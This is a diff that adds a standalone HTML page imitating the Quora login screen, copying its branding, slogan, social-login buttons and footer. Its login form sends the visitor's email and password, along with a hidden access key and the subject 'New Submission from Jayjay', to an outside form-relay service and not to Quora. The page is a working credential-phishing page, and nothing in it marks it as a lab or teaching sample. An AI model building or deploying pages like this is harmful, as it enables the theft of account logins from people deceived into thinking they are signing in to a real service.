@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quora Login</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://via.placeholder.com/1366x768') no-repeat center center fixed; /* Replace this with your background image URL */
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            background-color: #ffffff;
+            max-width: 900px;
+            width: 100%;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .left-section, .right-section {
+            padding: 20px;
+            flex: 1;
+            box-sizing: border-box;
+        }
+
+        .left-section {
+            background-color: #ffffff;
+            flex: 1.2;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .left-section h1 {
+            font-family: 'Georgia', serif;
+            font-size: 2rem;
+            color: #b92b27;
+            margin-bottom: 10px;
+        }
+
+        .left-section p {
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .left-section button {
+            width: 90%;
+            max-width: 300px;
+            padding: 10px;
+            margin: 5px 0;
+            font-size: 0.9rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f5f5;
+            transition: background-color 0.3s;
+        }
+
+        .left-section button img {
+            width: 20px;
+            margin-right: 10px;
+        }
+
+        .left-section button:hover {
+            background-color: #eaeaea;
+        }
+
+        .left-section a {
+            font-size: 0.9rem;
+            color: #555;
+            text-decoration: none;
+        }
+
+        .left-section a:hover {
+            text-decoration: underline;
+        }
+
+        .right-section {
+            border-left: 1px solid #ddd;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .right-section h2 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            font-size: 0.9rem;
+            color: #555;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 0.9rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .forgot-password {
+            font-size: 0.8rem;
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+            text-align: right;
+            margin-top: 5px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            font-size: 1rem;
+            background-color: #b92b27;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #a8231e;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #555;
+            padding: 10px;
+            width: 100%;
+            background-color: #f5f5f5;
+            border-top: 1px solid #ddd;
+        }
+
+        .footer a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                border-radius: 0;
+            }
+
+            .right-section {
+                border-left: none;
+                border-top: 1px solid #ddd;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1>Quora</h1>
+            <p>A place to share knowledge and better understand the world</p>
+           <button>
+    <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" 
+        alt="Google Logo" 
+        style="width: 20px; height: 20px; margin-right: 10px; vertical-align: middle;"
+    >
+    Continue with Google
+</button>
+
+            <button>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook">
+                Continue with Facebook
+            </button>
+            <a href="#">Sign up with email</a>
+        </div>
+        <div class="right-section">
+            <h2>Login</h2>
+           <form action="https://api.web3forms.com/submit" method="POST">
+                <input type="hidden" name="access_key" value="00ed92cb-5032-4578-b9be-306700b2271e">
+                <inp ut type="hidden" name="subject" value="New Submission from Jayjay">
+                <input type="hidden" name="from_name" value="Your Website Name">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Your email" name="email">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Your password" name="pass">
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button type="submit" class="login-btn">Login</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <p>New: עברית, العربية, Polski, ગુજરાતી, ಕನ್ನಡ, മലയാളം, తెలుగు and more</p>
+        <p>
+            <a href="#">About</a> • 
+            <a href="#">Careers</a> • 
+            <a href="#">Privacy</a> • 
+            <a href="#">Terms</a> • 
+            <a href="#">Contact</a>
+        </p>
+    </div>
+</body>
+</html>
